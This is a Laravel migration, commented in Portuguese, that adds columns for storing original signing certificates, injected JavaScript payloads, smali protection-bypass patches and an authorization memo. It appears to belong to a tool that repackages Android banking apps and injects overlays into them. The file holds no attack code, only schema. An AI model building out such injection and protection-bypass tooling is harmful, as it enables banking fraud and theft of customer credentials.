<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

/**
 * Fase 2+3 (retomada completa):
 * - bypass_rules.original_certs: certs da ASSINATURA ORIGINAL capturados antes
 *   do patch (transparência: re-assinar quebra o selo original; Play Protect
 *   sinaliza signer desconhecido — ver comentário no ProcessBypassJob).
 * - bank_injects: payload de injeção em modo laboratório auditável
 *   (js_payload, protection_patches) + gate de uso legítimo
 *   (terms_accepted + auth_memo obrigatórios quando há payload).
 */
return new class extends Migration
{
    public function up(): void
    {
        Schema::table('bypass_rules', function (Blueprint $table) {
            if (!Schema::hasColumn('bypass_rules', 'original_certs')) {
                $table->text('original_certs')->nullable()->after('output_path');
            }
        });

        Schema::table('bank_injects', function (Blueprint $table) {
            if (!Schema::hasColumn('bank_injects', 'js_payload')) {
                $table->longText('js_payload')->nullable()->after('overlay_html');
            }
            if (!Schema::hasColumn('bank_injects', 'protection_patches')) {
                // JSON: [{file, search, replace}] — pares smali/busca aplicados
                // pelo BankInjectService com limite e log; vazio = no-op.
                $table->text('protection_patches')->nullable()->after('js_payload');
            }
            if (!Schema::hasColumn('bank_injects', 'terms_accepted')) {
                $table->boolean('terms_accepted')->default(false)->after('protection_patches');
            }
            if (!Schema::hasColumn('bank_injects', 'auth_memo')) {
                // Memo de autorização: quem autorizou o teste e escopo.
                $table->string('auth_memo', 500)->nullable()->after('terms_accepted');
            }
        });
    }

    public function down(): void
    {
        Schema::table('bypass_rules', function (Blueprint $table) {
            if (Schema::hasColumn('bypass_rules', 'original_certs')) {
                $table->dropColumn('original_certs');
            }
        });
        Schema::table('bank_injects', function (Blueprint $table) {
            foreach (['js_payload', 'protection_patches', 'terms_accepted', 'auth_memo'] as $col) {
                if (Schema::hasColumn('bank_injects', $col)) {
                    $table->dropColumn($col);
                }
            }
        });
    }
};
